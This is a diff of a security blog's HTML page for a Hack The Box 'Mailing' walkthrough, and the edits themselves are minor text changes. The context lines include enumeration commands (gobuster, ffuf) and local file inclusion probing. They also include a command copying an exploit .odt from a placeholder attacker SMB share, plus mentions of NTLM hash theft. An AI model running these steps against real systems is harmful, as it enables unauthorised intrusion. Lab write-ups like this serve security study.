@@ -39,7 +39,7 @@
 <meta itemprop="name" content="HTB Mailing">
 <meta itemprop="description" content="Platform: Hack The Box Link: Mailing Level: Easy OS: Windows Mailing from HackTheBox is an interesting box. After our initial scan, we discover several email-related services. By exploiting an LFI vulnerability, we find two password hashes, and successfully cracking one of them gives us the admin password. We then use the recent MonikerLink vulnerability to retrieve a user&rsquo;s NTLM hash, which provides us with our initial foothold. Privilege escalation is achieved by placing a malicious file in a specific directory where all files with the ."><meta itemprop="datePublished" content="2024-09-06T23:42:37-05:00" />
 <meta itemprop="dateModified" content="2024-09-06T23:42:37-05:00" />
-<meta itemprop="wordCount" content="1492"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Runner/Runner.png" />
+<meta itemprop="wordCount" content="1489"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Runner/Runner.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Runner/Runner.png" /><meta name="twitter:title" content="HTB Mailing"/>
@@ -158,7 +158,7 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        8 minutes
+        7 minutes
 
          | Also available in
           
@@ -269,7 +269,7 @@ if (!doNotTrack) {
 <p>Continuing with the enumeration process, directory and subdomain enumeration are both unfruitful.</p>
 <pre tabindex="0"><code>gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 </code></pre><pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://mailing.htb/ -H &#34;Host: FUZZ.mailing.htb&#34; -ic -fs 4681
-</code></pre><p>On the website, after capturing the request we get with the <code>Download Instructions</code> button we can observe the <code>file</code> parameter being included. If this is not properly secured we could have a potential LFI vulnerability (Local File Inclusion).</p>
+</code></pre><p>After capturing the request we get with the <code>Download Instructions</code> button we can observe the <code>file</code> parameter being included. If this is not properly secured we could have a potential LFI vulnerability (Local File Inclusion).</p>
 <p><img src="https://scorpiosec.com/images/HTB-Mailing/download-request.png" alt="Mailing Download button request"></p>
 <p>We see that the application is using <code>ASP.NET</code> with <code>IIS</code> for the server. We know that the <code>web.config</code> file must be present at the web root location <code>C:\inetpub\wwwroot</code> for <code>ASP.NET</code> applications to function correctly. So we can try to read the content of the file in order to confirm our LFI possibility.
 <em>Read more about it <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0#webconfig-file-location" target="_blank" >here</a>
@@ -351,7 +351,7 @@ PASS homenetworkingadministrator
 <p><img src="https://scorpiosec.com/images/HTB-Mailing/access-denied-localadmin.png" alt="localadmin user, access denied"></p>
 <p>In <code>Program Files</code> we notice that <code>Libre Office</code> is installed. This is noteworthy (at least for me) as it&rsquo;s usually used on Linux systems. The file <code>readme_en-US.txt</code> in <code>C:\Program Files\libreOffice\readmes</code> reveals the version running.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Mailing/LibreOffice-version.png" alt="Libre Office version"></p>
-<p>In <code>C:\Program Files\LibreOffice\program\</code> we find the <code>soffice.ps1</code> script.</p>
+<p>In <code>C:\Program Files\LibreOffice\program\</code> we find a <code>soffice.ps1</code> script.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Set the directory where the .odt files are located</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>directory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\Users\Public\Documents&#34;</span>
 </span></span><span style="display:flex;"><span>
@@ -434,7 +434,7 @@ copy \\MY_IP\mailing\exploit.odt
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1492 Words
+        1489 Words
       </p>
 
       <p>
